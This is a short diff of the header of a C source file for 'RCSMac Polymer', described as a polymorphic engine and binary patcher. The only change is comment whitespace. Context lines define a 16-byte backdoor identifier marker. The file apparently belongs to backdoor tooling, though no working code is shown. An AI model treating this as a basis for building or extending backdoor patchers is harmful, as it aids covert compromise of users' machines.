@@ -1,13 +1,13 @@
 /*
-* RCSMac Polymer
-*  poly engine and binary patcher
-*
-* binary patcher created by Massimo Chiodini on 10/11/2009
-* refactored and fixed by Alfredo 'revenge' Pesoli on 17/11/2009
-*
-* Copyright (C) HT srl 2009. All rights reserved
-*
-*/
+ * RCSMac Polymer
+ *  poly engine and binary patcher
+ *
+ * binary patcher created by Massimo Chiodini on 10/11/2009
+ * refactored and fixed by Alfredo 'revenge' Pesoli on 17/11/2009
+ *
+ * Copyright (C) HT srl 2009. All rights reserved
+ *
+ */
 
 #define BACKDOOR_ID_MARK      (BYTE *)"av3pVck1gb4eR2d8"
 #define BACKDOOR_ID_LEN       16
